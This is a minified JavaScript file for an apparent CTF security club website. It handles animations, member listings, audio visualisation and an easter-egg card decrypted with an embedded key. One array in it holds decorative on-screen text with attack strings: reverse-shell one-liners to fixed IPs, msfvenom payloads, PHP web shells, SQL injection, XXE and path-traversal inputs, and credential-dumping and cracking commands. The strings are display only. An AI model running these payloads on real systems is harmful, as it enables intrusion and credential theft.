var TKCTF=(()=>{var $=(t,e,o)=>new Promise((n,i)=>{var s=r=>{try{c(o.next(r))}catch(l){i(l)}},a=r=>{try{c(o.throw(r))}catch(l){i(l)}},c=r=>r.done?n(r.value):Promise.resolve(r.value).then(s,a);c((o=o.apply(t,e)).next())});var I="medium",f=!1;function Le(t){I!==t&&(I=t,document.querySelectorAll(".performance-btn").forEach(e=>{e.classList.remove("active")}),document.querySelector(`[data-level="${t}"]`).classList.add("active"),localStorage.setItem("tkctf-performance-level",t),Me())}function Me(){let t=document.getElementById("dataStreams");t&&(t.innerHTML="",he()),ae();let e=b();[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(n=>{document.querySelectorAll(n).forEach(s=>{s.classList.remove("fade-in-visible"),!e.enableFadeAnimations&&(n===".role-tag"||n===".code-name")?(s.style.opacity="1",s.style.transform="translateY(0)",s.style.transition="none"):(s.style.opacity="0",s.style.transform="translateY(30px)",s.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),setTimeout(()=>{ie()},100)}function Ie(){let t=document.getElementById("performanceToggle"),e=document.querySelector(".collapse-icon");if(!F){let o=t.offsetHeight;o>0&&(ee=o)}F=!F,F?(t.classList.add("collapsed"),e.textContent="<",ee>0&&(t.style.height=ee+"px")):(t.classList.remove("collapsed"),e.textContent=">",t.style.height=""),localStorage.setItem("tkctf-performance-toggle-collapsed",F),ke()}function ke(){X()}function X(){let t=document.querySelector("nav"),e=document.getElementById("performanceToggle");if(!t||!e)return;let o=t.getBoundingClientRect(),n=e.getBoundingClientRect(),s=window.innerWidth>=768?20:10;if(o.top<=25){let c=s+n.height,r=o.top,l=c>=r,d=!(o.right<n.left||o.left>n.right);if(l&&d){if(!D){let g=r+o.height+10;e.style.top=g+"px",D=!0}}else D&&(e.style.top=s+"px",D=!1)}else D&&(e.style.top=s+"px",D=!1)}function b(){return{low:{dataStreamCount:f?4:12,binaryStreamCount:f?Math.floor(1.6):8,spectrumBarCount:Math.floor(f?window.innerWidth/24:window.innerWidth/12),spectrumBarWidth:f?16:8,enableBinaryDigits:!1,enableSpectrumHighlight:!1,enableDataStreamGlitch:!1,enableLogoBeats:!1,enableFadeAnimations:!1,particleCount:f?12:18,dataStreamDrift:f?30:100,typewriterWaitTime:4500},medium:{dataStreamCount:f?8:16,binaryStreamCount:f?Math.floor(4):8,spectrumBarCount:Math.floor(f?window.innerWidth/24:window.innerWidth/12),spectrumBarWidth:f?16:8,enableBinaryDigits:!0,enableSpectrumHighlight:!0,enableDataStreamGlitch:!0,enableLogoBeats:!0,enableFadeAnimations:!0,particleCount:f?15:20,dataStreamDrift:f?50:100,typewriterWaitTime:3500},high:{dataStreamCount:f?12:20,binaryStreamCount:8,spectrumBarCount:Math.floor(f?window.innerWidth/18:window.innerWidth/12),spectrumBarWidth:f?12:8,enableBinaryDigits:!0,enableSpectrumHighlight:!0,enableDataStreamGlitch:!0,enableLogoBeats:!0,enableFadeAnimations:!0,particleCount:f?18:20,dataStreamDrift:100,typewriterWaitTime:2500}}[I]}function he(){let t=document.getElementById("dataStreams"),e=b(),o=e.dataStreamCount,n=["0x4D5A90000300000004000000FFFF0000B800000000000000400000","GET /api/security HTTP/1.1",`POST /login HTTP/1.1
Content-Type: application/json`,`Connection: keep-alive
Authorization: Bearer eyJ0eXAi`,"SELECT * FROM users WHERE id = ?","UNION SELECT username,password FROM admin","INSERT INTO logs (timestamp, event) VALUES","nmap -sS -O target.com","hydra -l admin -P passwords.txt ssh://target","john --wordlist=rockyou.txt hash.txt",'sqlmap -u "http://target.com/login.php"',"python3 exploit.py --target 192.168.1.100","U2VjcmV0OiBCR00gT04gKyBkaXYgRm9vdGVyIOKGk+KGk+KGkw==","use exploit/multi/handler","set PAYLOAD windows/x64/meterpreter/reverse_tcp","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f elf -o reverse.elf","ncat.exe%20112.34.55.67%204444%20-e%20cmd","/bin/bash -i >& /dev/tcp/112.34.55.67/4444 0>&1","nc -lvnp 4444",'msfconsole -q -x "use exploit/multi/handler"','curl -X POST -d "username=admin&password=123"','wireshark -i eth0 -f "tcp port 80"',"tcpdump -i any -w capture.pcap","openssl s_client -connect target.com:443","ssh-keygen -t rsa -b 4096","gpg --gen-key --default-new-key-algo rsa4096","hashcat -a 0 -m 1000 hashes.txt wordlist.txt","aircrack-ng -w wordlist.txt capture.cap","dirb http://target.com/ /usr/share/wordlists/","gobuster dir -u http://target.com -w wordlist.txt",'<script>alert("XSS")<\/script>',"../../../../etc/passwd","{{7*7}}[[7*7]]",'<?php system($_GET["cmd"]); ?>','eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"))',"LDAP injection: *)(&(objectClass=*)",'XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',"' OR '1'='1' --","'; DROP TABLE users; --","' UNION SELECT NULL,username,password FROM admin --","1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --","masscan -p1-65535 --rate=1000 192.168.1.0/24","nmap -sV -sC -A target.com","nmap --script vuln target.com","nikto -h http://target.com","whatweb http://target.com","fierce -dns target.com","dnsrecon -d target.com -t brt","sublist3r -d target.com","medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt","crackmapexec smb 192.168.1.0/24 -u admin -p password123","wpscan --url http://target.com --enumerate u,p","use auxiliary/scanner/smb/smb_version","use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 192.168.1.100","exploit -j","search cve:2021-44228","use post/windows/gather/hashdump","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.87 LPORT=443 -f exe -o payload.exe","msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f raw > shell.php","msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f war > shell.war",`python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.0.87',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`,`php -r "$sock=fsockopen('10.10.0.87',4444);exec('/bin/sh -i <&3 >&3 2>&3');"`,`ruby -rsocket -e"f=TCPSocket.open('10.10.0.87',4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"`,`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.0.87',4444);"`,"ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//","arpspoof -i eth0 -t 192.168.1.100 192.168.1.1","responder -I eth0 -rdw","mitmdump -s script.py","hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a","john --format=NT hashes.txt","ophcrack -t tables/ -f hashes.txt","fcrackzip -D -p rockyou.txt archive.zip","airodump-ng wlan0mon","aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon","aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap","wifite --kill","kismet -c wlan0","ffuf -w wordlist.txt -u http://target.com/FUZZ","dirsearch -u http://target.com -e php,html,js","feroxbuster -u http://target.com -w wordlist.txt","wfuzz -w wordlist.txt http://target.com/FUZZ",'sqlmap -u "http://target.com/page.php?id=1" --dbs','sqlmap -u "http://target.com/page.php?id=1" --dump-all','sqlmap -u "http://target.com/page.php?id=1" --os-shell',"NoSQLMap -t mongodb://target.com:27017","setoolkit","gophish server --listen 0.0.0.0:3333","beef-xss","shellphish","mimikatz # sekurlsa::logonpasswords","bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all","winpeas.exe","linpeas.sh","privilege escalation: sudo -l","find / -perm -u=s -type f 2>/dev/null",'tshark -i eth0 -f "tcp port 80" -w capture.pcap',"tcpflow -i eth0 -c","dsniff -i eth0","urlsnarf -i eth0","volatility -f memory.dump imageinfo","autopsy case.db",'grep -r "error" /var/log/',"logstash -f config.conf","steghide embed -cf image.jpg -ef secret.txt","binwalk -e firmware.bin","strings binary | grep -i password","hexdump -C file.bin | head -20","burpsuite --config-file=config.json","postman collection run security-tests.json","owasp-zap-cli quick-scan --self-contained http://target.com",'curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token123"'];for(let i=0;i<o;i++){let s=document.createElement("div");s.className="data-stream";let a=n[Math.floor(Math.random()*n.length)];s.textContent=a,s.setAttribute("data-text",a);let c=Math.random()*window.innerWidth,r=(Math.random()-.5)*e.dataStreamDrift,l=Math.random()*8;s.style.left=c+"px",s.style.setProperty("--drift-x",r+"px"),s.style.animationDelay=`-${l}s`,t.appendChild(s)}Ae()}function Ae(){let t=document.getElementById("dataStreams"),o=b().binaryStreamCount;for(let n=0;n<o;n++){let i=document.createElement("div");i.className="binary-stream";let s="";for(let r=0;r<80;r++)s+=Math.random()>.5?"1":"0",r%8===7&&(s+=" ");i.textContent=s,i.setAttribute("data-text",s);let a=Math.random()*window.innerHeight,c=Math.random()*20;i.style.top=a+"px",i.style.animationDelay=`-${c}s`,t.appendChild(i)}}function Pe(t){let e=document.querySelector(t);if(e){let o=document.querySelector("nav"),n=e.querySelector("h2"),i=o?o.offsetHeight:0,s=n?n.offsetHeight:0,a=i+s,r=e.getBoundingClientRect().top+window.pageYOffset-a;window.scrollTo({top:r,behavior:"smooth"})}}document.querySelectorAll('nav a[href^="#"]').forEach(t=>{t.addEventListener("click",function(e){e.preventDefault(),Pe(this.getAttribute("href"))})});function ie(){let t=window.innerHeight,e=t*.7,n=b().enableFadeAnimations?[".president-item",".contact-item","#friendsList",".president-members",".member-row",".role-tag",".code-name"]:[".president-item",".president-members","#friendsList"];document.querySelectorAll(".content-section").forEach((s,a)=>{if(s.classList.contains("fade-in-visible"))return;let c=s.getBoundingClientRect().top,r=s.getBoundingClientRect().height,l=t*.85,d=r*.05;if(c<l-d&&c>-r){let g=a*100;setTimeout(()=>{s.style.opacity="1",s.style.transform="translateY(0)",s.classList.add("fade-in-visible"),s.style.transition="opacity 1.5s ease, transform 1.5s ease"},g)}}),n.forEach(s=>{document.querySelectorAll(s).forEach((c,r)=>{if(c.classList.contains("fade-in-visible"))return;let l=c.getBoundingClientRect().top,d=c.getBoundingClientRect().height,m=d*.05;if(l<t-m&&l>-d){let u=r*50;setTimeout(()=>{c.style.opacity="1",c.style.transform="translateY(0)",c.classList.add("fade-in-visible"),c.id},u)}})})}function He(){let t=document.getElementById("backToTop"),e=document.querySelector("footer");if(!t)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=e?e.getBoundingClientRect().top+window.pageYOffset:1/0,i=window.innerHeight,s=window.innerWidth<768,a=s?20:30,c=s?45:50;if(o>200)if(t.classList.add("show"),o+i-c-a+c+10>n){let l=o+i-n+10;t.style.bottom=l+"px"}else t.style.bottom=a+"px";else t.classList.remove("show")}function De(){O(),window.scrollTo({top:0,behavior:"smooth"})}function Fe(){return $(this,null,function*(){try{let e=yield(yield fetch("./data/members.json")).json();Ne(e.presidents),Oe(e.members)}catch(t){console.error("\u52A0\u8F7D\u6210\u5458\u6570\u636E\u5931\u8D25:",t)}})}function Re(){return $(this,null,function*(){try{let e=yield(yield fetch("./data/friends.json")).json();qe(e.friends)}catch(t){console.error("\u52A0\u8F7D\u53CB\u94FE\u6570\u636E\u5931\u8D25:",t)}})}function Ne(t){let e=document.getElementById("presidentsList");if(!e)return;let o=Object.keys(t).sort((n,i)=>n-i);e.innerHTML="",o.forEach((n,i)=>{let s=t[n];if(!s)return;let a=document.createElement("div");a.className="president-item",a.style.opacity="0",a.style.transform="translateY(30px)",a.style.transition="opacity 0.6s ease, transform 0.6s ease",a.style.animationDelay=`${i*300}ms`;let c=document.createElement("div");c.className="president-year",c.textContent=`${n}\u5C4A\u625B\u628A\u5B50`,a.appendChild(c);let r=document.createElement("div");r.className="president-names",a.appendChild(r);let l=document.createElement("div");if(l.className="achievements",l.innerHTML=s.achievements||"\u4E3B\u8981\u6210\u5C31\uFF1A\u6682\u65E0\u8BB0\u5F55",a.appendChild(l),!s.members||s.members.length===0){let d=document.createElement("span");d.className="unknown-member",d.innerHTML='> Error: Permission denied\uFF08\u7EC6\u8282\u6709\u5F85\u8003\u8BC1\uFF09<span class="blinking-cursor">_</span>',r.appendChild(d)}else{let d=document.createElement("div");d.className="president-members",d.style.opacity="0",d.style.transform="translateY(30px)",d.style.transition="opacity 0.6s ease, transform 0.6s ease",s.members.forEach((m,g)=>{let u=document.createElement("div");u.className="member-row",u.style.animationDelay=`${g*.1}s`,u.style.opacity="0",u.style.transform="translateY(30px)",u.style.transition="opacity 0.6s ease, transform 0.6s ease";let w=document.createElement("span");w.className="member-name",w.textContent=m.name,u.appendChild(w),m.roles.forEach(q=>{let S=document.createElement("span"),Q;U(q)?Q=Ye(q):Q=j(q),S.className=`role-tag ${Q}`,S.textContent=q,b().enableFadeAnimations?(S.style.opacity="0",S.style.transform="translateY(30px)",S.style.transition="opacity 0.6s ease, transform 0.6s ease"):(S.style.opacity="1",S.style.transform="translateY(0)",S.style.transition="none"),Ge(m.roles)&&!U(q)&&$e(S,m.roles),u.appendChild(S)});let h=document.createElement("span");!m.codeName||m.codeName.trim()===""?(h.className="code-name null",h.textContent="Error: code-name not found"):(h.className="code-name",We(h,m.codeName)),b().enableFadeAnimations?(h.style.opacity="0",h.style.transform="translateY(30px)",h.style.transition="opacity 0.6s ease, transform 0.6s ease"):(h.style.opacity="1",h.style.transform="translateY(0)",h.style.transition="none"),u.appendChild(h),d.appendChild(u)}),r.appendChild(d)}e.appendChild(a)})}function Oe(t){let e=document.getElementById("membersList");if(!e)return;let o=Object.keys(t).sort((n,i)=>i-n);e.innerHTML="",o.forEach((n,i)=>{let s=t[n];if(!s)return;let a=document.createElement("div");a.className="member-group";let c=document.createElement("div");c.className="member-year",c.textContent=`${n}\u5C4A`,a.appendChild(c);let r=document.createElement("div");r.className="member-list",s.length===0?r.textContent="\uFF08\u5F85\u8865\u5145\uFF09":r.textContent=s.join("\u3001"),a.appendChild(r),e.appendChild(a)})}function qe(t){let e=document.getElementById("friendsList");if(!e)return;let o=t.map(n=>`<a href="${n.url}" target="_blank">${n.name}</a>`);e.innerHTML=`<p>${o.join("\u3001")}</p>`,e.style.opacity="0",e.style.transform="translateY(30px)",e.style.transition="opacity 0.6s ease, transform 0.6s ease"}function We(t,e){let o=e.includes("/")?e.split("/"):[e],n=0,i=!0,s="",c=b().typewriterWaitTime;function r(){let l=o[n].trim();i?s.length<l.length?(s=l.substring(0,s.length+1),t.textContent=s,setTimeout(r,100+Math.random()*100)):setTimeout(()=>{i=!1,r()},c):s.length>0?(s=s.substring(0,s.length-1),t.textContent=s,setTimeout(r,50)):(n=(n+1)%o.length,i=!0,setTimeout(r,200))}r()}function U(t){let e=t.toLowerCase();return e.includes("\u7814\u53D1\u603B\u76D1")||e.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")}function j(t){let e=t.toLowerCase();return e.includes("\u6280\u672F")||e.includes("\u653B\u9632")?"tech":e.includes("\u884C\u653F\u8FD0\u8425")?"admin":e.includes("\u7ADE\u8D5B")?"competition":e.includes("\u5BA3\u4F20")?"promotion":"default"}function Ye(t){let e=t.toLowerCase();return e.includes("\u7814\u53D1\u603B\u76D1")?"director":e.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")?"teacher":"default"}function Ge(t){let e=t.filter(n=>!U(n)),o=new Set;return e.forEach(n=>{if(n.includes("/"))n.split("/").forEach(s=>{let a=j(s.trim());o.add(a)});else{let i=j(n);o.add(i)}}),o.size>1}function je(t){let e={tech:"#4a36ff",admin:"#11ffff",competition:"#ffbe32",promotion:"#ff9ff3",default:"#39b8eb"},o=new Set;return t.filter(i=>!U(i)).forEach(i=>{if(i.includes("/"))i.split("/").forEach(a=>{let c=j(a.trim());o.add(e[c])});else{let s=j(i);o.add(e[s])}}),Array.from(o)}function $e(t,e){let o=je(e);if(o.length<=1)return;let n=o.map((i,s)=>{let a=s/(o.length-1)*100;return`${i} ${a}%`}).join(", ");t.style.background=`linear-gradient(135deg, ${n})`,t.style.border="1px solid rgba(255, 255, 255, 0.4)",t.style.boxShadow="0 0 20px rgba(255, 255, 255, 0.5)"}document.addEventListener("DOMContentLoaded",function(){f=window.innerWidth<768,ne=window.pageYOffset||document.documentElement.scrollTop,he(),ae();let t=b();[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(m=>{document.querySelectorAll(m).forEach(u=>{!t.enableFadeAnimations&&(m===".role-tag"||m===".code-name")?(u.style.opacity="1",u.style.transform="translateY(0)",u.style.transition="none"):(u.style.opacity="0",u.style.transform="translateY(30px)",u.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),ie(),Fe(),Re();let o=document.querySelector(".about-title");o&&setTimeout(()=>{o.classList.add("loaded")},100);let n=document.getElementById("backToTop");n&&n.addEventListener("click",De);let i=document.getElementById("logoContainer"),s=document.getElementById("bgmAudio");if(i&&s&&(rt(),ct(),i.addEventListener("click",ht),s.addEventListener("ended",yt),N("initial"),f)){let m=document.getElementById("logo");m&&(m.style.transform="")}s&&(s.volume=1,s.loop=!0);let c="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,r=localStorage.getItem("tkctf-performance-level");r&&["low","medium","high"].includes(r)&&(I=r,document.querySelectorAll(".performance-btn").forEach(m=>{m.classList.remove("active")}),document.querySelector(`[data-level="${r}"]`).classList.add("active")),document.querySelectorAll(".performance-btn").forEach(m=>{m.addEventListener("click",()=>{let g=m.getAttribute("data-level");Le(g)})}),localStorage.getItem("tkctf-performance-toggle-collapsed")==="true"&&(F=!0,document.getElementById("performanceToggle").classList.add("collapsed"),document.querySelector(".collapse-icon").textContent="<");let d=document.getElementById("performanceToggleCollapse");d&&d.addEventListener("click",Ie),setTimeout(()=>{X()},1e3),setInterval(()=>{X()},500)});var Ve=0;var k=!1,T=0,ye=1,Z=!1,J=!1,ne=0,W=0,ce=0,F=!1,ee=0,D=!1,le=0,ze=2e3;function _e(){let t=document.getElementById("mainFooter");if(!t||k)return;let e=document.getElementById("bgmAudio");if(!e||e.paused)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=t.offsetTop,i=window.innerHeight,s=document.documentElement.scrollHeight,a=o+i>=s-1,c=o+i>=n+t.offsetHeight;a&&c&&Ue()}function we(){let t=document.getElementById("mainFooter");if(!t)return!1;let e=window.pageYOffset||document.documentElement.scrollTop,o=t.offsetTop,n=window.innerHeight,i=document.documentElement.scrollHeight;if("ontouchstart"in window||navigator.maxTouchPoints>0){let a=e+n>=i-20,c=e+n>=o-50;return a&&c}else{let a=e+n>=i-1,c=e+n>=o+t.offsetHeight;return a&&c}}function Ke(t){let e=document.getElementById("mainFooter");if(!e)return;let o=document.getElementById("bgmAudio");if(!o||o.paused)return;let n=window.pageYOffset||document.documentElement.scrollTop,i=e.offsetTop,s=window.innerHeight,a=document.documentElement.scrollHeight,c=n+s>=a-1,r=n+s>=i+e.offsetHeight;if(c&&r){let l=Date.now();if(t.deltaY>0){if(!k){let d=Math.abs(t.deltaY),m=1+Math.min(2,d/150);W+=d*m;let g=250,u=3200;if(l-ce<g){if(W>=u){t.preventDefault();let w=Math.min(3,Math.max(1,Math.ceil(W/1200)));for(let h=0;h<w;h++)be(0);W=0}}else W=d*m;ce=l}}else t.deltaY<0&&(k?(t.preventDefault(),ve()):T>0&&(t.preventDefault(),O()))}}function Xe(t){let e=document.getElementById("particleContainer");if(!e)return;let o=Math.min(5+t*2,30);for(let n=0;n<o;n++){let i=document.createElement("div");i.className="particle",i.style.left=Math.random()*100+"%",i.style.animationDelay=Math.random()*2+"s",i.style.animationDuration=2+Math.random()*2+"s";let s=2+t*.5;i.style.width=s+"px",i.style.height=s+"px";let a=.5+t*.05;i.style.boxShadow=`0 0 ${10+t}px #00e4ff, 0 0 ${20+t*2}px #00e4ff, 0 0 ${30+t*3}px #00e4ff`,e.appendChild(i),setTimeout(()=>{i.parentNode&&i.parentNode.removeChild(i)},3e3)}}function Ue(){Z||(Z=!0,Xe(1),setTimeout(()=>{Z=!1},100))}function be(t){if(!document.getElementById("mainFooter"))return;J&&(T=0,J=!1),T++;let n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150;T>=n?Ze():T/n>=.01&&Je()}function O(){let t=document.getElementById("mainFooter");if(!t)return;ye=1,t.style.borderTopWidth="1px",T=0,J=!0,document.querySelectorAll(".persistent-glow").forEach(n=>n.remove());let o=document.getElementById("dataStreams");o&&(o.style.transition="opacity 1s ease-in",o.style.opacity="1")}function Je(){let t=document.getElementById("persistentGlow");if(t){Qe(t);return}let e=document.createElement("div");e.id="persistentGlow",e.className="persistent-glow";let o=window.innerWidth<768,i="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,s=Math.min(T/i,1),a=o?15:20,r=a+(135-a)*s,l=o?.4:.6,m=l+(.9-l)*s;if(e.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${r}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${m}), transparent);
        z-index: 1000;
        will-change: opacity, transform;
        animation: persistentGlow 2s ease-in-out infinite;
        pointer-events: none;
    `,document.body.appendChild(e),o){let g=document.getElementById("dataStreams");g&&(g.style.transition="opacity 1s ease-out",g.style.opacity="0")}}function Qe(t){let e=window.innerWidth<768,n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,i=Math.min(T/n,1),s=e?15:20,c=s+(135-s)*i,r=e?.4:.6,d=r+(.9-r)*i;t.style.height=`${c}px`,t.style.background=`linear-gradient(to top, rgba(0, 228, 255, ${d}), transparent)`}function Ze(){k=!0;let t=document.getElementById("easterEgg"),e=document.getElementById("mainFooter");if(!t)return;e&&(e.style.display="none");let o=document.getElementById("persistentGlow");o&&(o.style.display="none");let n=document.getElementById("dataStreams");n&&(n.style.transition="opacity 1s ease-in",n.style.opacity="1"),ot(),t.classList.add("show"),t.scrollIntoView({behavior:"smooth"}),bt()}function et(){let t=["IUAj","S2V5","U2VjcmV0","MjAyNQ==","Q1RG","VEs="],e=Object.assign({},{"!":"A","@":"B","#":"C",T:"D",K:"E",C:"F",F:"G",2:"H",0:"I",5:"J",S:"K",e:"L",c:"M",r:"N",t:"O"},{K:"P",e:"Q",y:"R","!":"S","@":"T"}),o=[];for(let a of t)o.push(atob(a));let n=o.join(""),i={};for(let[a,c]of Object.entries(e))i[c]=a;let s="";for(let a of n)s+=i[a]||a;return s}function tt(t){try{let e=et(),n=CryptoJS.AES.decrypt(t,e).toString(CryptoJS.enc.Utf8);if(!n)throw new Error("\u89E3\u5BC6\u5931\u8D25\u6216\u5BC6\u94A5\u9519\u8BEF");return n}catch(e){throw console.error("\u89E3\u5BC6\u5931\u8D25:",e),e}}function ot(){return $(this,null,function*(){let t=document.getElementById("cardContent");if(t)try{let e=yield fetch("./data/Card.encrypted");if(!e.ok)throw new Error("Failed to load encrypted card content");let o=yield e.text(),n=tt(o);t.innerHTML=n,de()}catch(e){console.error("\u52A0\u8F7D\u6216\u89E3\u5BC6\u5361\u7247\u5185\u5BB9\u5931\u8D25:",e),t.innerHTML='<div class="card-container" id="cardContainer"><div class="card" id="card"><div class="card-front"><img src="./img/TKCTF512.svg" alt="TKCTF Logo" class="card-logo"></div><div class="card-back"><div class="card-content"><h4>\u5173\u4E8E\u672C\u7F51\u7AD9</h4><p>\u5185\u5BB9\u52A0\u8F7D\u5931\u8D25</p></div></div></div></div>',de()}})}function ve(){k=!1,Ve=0,T=0,ye=1,J=!1;let e="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,o=document.getElementById("easterEgg"),n=document.getElementById("mainFooter");if(!o)return;o.classList.remove("show");let i=document.getElementById("cardContent");i&&(i.innerHTML=""),Be();let s=document.getElementById("persistentGlow");s&&s.remove();let a=document.getElementById("dataStreams");a&&(a.style.transition="opacity 1s ease-in",a.style.opacity="1"),n&&(n.style.display="",n.style.borderTopWidth="1px"),n&&n.scrollIntoView({behavior:"smooth"})}function de(){let t=document.getElementById("card");t&&t.addEventListener("click",function(){t.classList.contains("flipped")?t.classList.remove("flipped"):t.classList.add("flipped")})}window.addEventListener("scroll",()=>{let t=window.pageYOffset||document.documentElement.scrollTop;t<ne-1&&T>0&&O(),ne=t,He(),ie(),_e(),nt()});function nt(){if(!document.getElementById("mainFooter")||k)return;let e=document.getElementById("bgmAudio");!e||e.paused||we()&&wt()}window.addEventListener("wheel",Ke,{passive:!1});var Y=0,G=0,Ee=0,Te=0,Ce=!1;window.addEventListener("touchstart",function(t){Y=t.touches[0].clientY,Ee=Date.now(),Ce=!1},{passive:!0});window.addEventListener("touchmove",function(t){Ce=!0},{passive:!0});window.addEventListener("touchend",function(t){if(G=t.changedTouches[0].clientY,Te=Date.now(),k){Y<G&&ve();return}let e=document.getElementById("bgmAudio");!e||e.paused||!document.getElementById("mainFooter")||setTimeout(()=>{st()},100)},{passive:!0});function st(){if(!document.getElementById("mainFooter"))return;let e=Math.abs(G-Y),o=Te-Ee;if(Y<G&&e>5&&o<2e3)T>0&&O();else if(we()){let n=window.innerHeight*.45;Y>G&&e>n&&o<500&&be(0)}}var C=!1,x=null,y=null,v=null,L=[];var me=0,M=null,_=null,A=!1,p=null,ue=null,B=null,H=!1,te=0,oe=0,V=0,z=0,fe=0,R=[],P=!1;function it(){try{x=new(window.AudioContext||window.webkitAudioContext);let t=document.getElementById("bgmAudio"),e=x.createMediaElementSource(t);y=x.createAnalyser(),y.fftSize=2048,y.smoothingTimeConstant=.8;let o=y.frequencyBinCount;return v=new Uint8Array(o),e.connect(y),y.connect(x.destination),at(),!0}catch(t){return!1}}function at(){if(!window.Worker){console.warn("Web Worker not supported, falling back to main thread"),A=!1;return}try{let t=(window.location.hostname==="localhost"||window.location.hostname==="127.0.0.1","./src/spectrum-worker.min.js");M=new Worker(t),A=!0,M.onmessage=function(e){let{type:o,data:n}=e.data;switch(o){case"initComplete":M.postMessage({type:"config",data:{fftSize:y.fftSize,sampleRate:x.sampleRate,beatThreshold:188,beatCooldown:25,heavyBeatCooldown:120}});break;case"processedSpectrumData":_=n;break;case"error":console.error("Spectrum worker error:",n);break;case"workerStopped":break}},M.onerror=function(e){console.error("Spectrum worker error:",e),A=!1},M.postMessage({type:"init",data:{fftSize:y.fftSize,sampleRate:x.sampleRate}})}catch(t){console.error("Failed to create spectrum worker:",t),A=!1}}function rt(){let t=document.getElementById("logo");fetch("./img/TKCTF512.svg").then(e=>e.text()).then(e=>{if(t.innerHTML=e,p=t.querySelector("svg"),p){p.id="logoSvg",p.style.width="100%",p.style.height="100%";let o=p.viewBox.baseVal,n=o.width||1e3;ue={T0:p.querySelector(".T0"),K:p.querySelector(".K"),C:p.querySelector(".C"),T1:p.querySelector(".T1"),F:p.querySelector(".F")};let i=p.querySelector("defs");i||(i=document.createElementNS("http://www.w3.org/2000/svg","defs"),p.insertBefore(i,p.firstChild));let s=document.createElementNS("http://www.w3.org/2000/svg","clipPath");s.id="progressClip",B=document.createElementNS("http://www.w3.org/2000/svg","rect"),B.setAttribute("x","0"),B.setAttribute("y","0"),B.setAttribute("width","0"),B.setAttribute("height",o.height||1e3),s.appendChild(B),i.appendChild(s);let a=document.createElementNS("http://www.w3.org/2000/svg","g");a.id="progressGroup",a.setAttribute("clip-path","url(#progressClip)"),Object.values(ue).forEach(c=>{if(c){c.style.fill="#010101";let r=c.cloneNode(!0);r.style.fill="#00a2ff",r.style.filter="drop-shadow(0 0 8px rgba(0, 162, 255, 0.8))",a.appendChild(r)}}),p.appendChild(a)}}).catch(e=>console.error("\u52A0\u8F7DSVG\u5931\u8D25:",e))}function ct(){let t=document.getElementById("logoContainer");if(f)return;t.addEventListener("mousemove",o=>{let n=t.getBoundingClientRect(),i=n.left+n.width/2,s=n.top+n.height/2;te=(o.clientX-i)/10,oe=(o.clientY-s)/10}),t.addEventListener("mouseleave",()=>{te=0,oe=0});function e(){if(V+=(te-V)*.15,z+=(oe-z)*.15,!H&&Math.abs(V)>.1||Math.abs(z)>.1){let o=document.getElementById("logo");(o.style.transform||"").includes("scale")||(o.style.transform=`translate(${V}px, ${z}px)`)}requestAnimationFrame(e)}e()}function se(t){if(!p)return;let e=document.getElementById("logoContainer"),o=document.createElement("div");o.className="trail-particle";let n=p.cloneNode(!0);n.style.width="100%",n.style.height="100%",n.style.transform=`rotate(${t}deg)`,n.style.filter="drop-shadow(0 0 20px rgba(0, 255, 255, 0.9)) brightness(1.3)",o.appendChild(n),e.appendChild(o),setTimeout(()=>{o.style.opacity="0.6",o.style.transition="opacity 0.1s ease-out"},10),setTimeout(()=>{o.style.opacity="0",o.style.transition="opacity 0.3s ease-out"},100),setTimeout(()=>{o.remove()},400)}function lt(t){let e=document.getElementById("logoContainer"),o=document.createElement("div");o.className="pulse-ring",o.style.width="120px",o.style.height="120px",o.style.border=`${3+t*2}px solid rgba(0, 255, 255, ${.9})`,o.style.boxShadow="0 0 30px rgba(0, 255, 255, 0.8), inset 0 0 30px rgba(0, 162, 255, 0.5)",o.style.animation="beatPulse 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards",e.appendChild(o),setTimeout(()=>o.remove(),800)}function dt(){let t=document.getElementById("logoContainer"),e=document.createElement("div");e.className="wave-ring",e.style.width="120px",e.style.height="120px",t.appendChild(e),setTimeout(()=>e.remove(),320)}function mt(){if(!y||!v||!C)return;y.getByteFrequencyData(v);let t=0,e=0;A&&_?(t=_.spectrumFeatures.totalEnergy,e=_.spectrumFeatures.spectralCentroid):t=v.reduce((a,c)=>a+c)/v.length/255;let n=5+t*12,i=(Math.random()-.5)*(1+t*8);if(!P&&!H){let 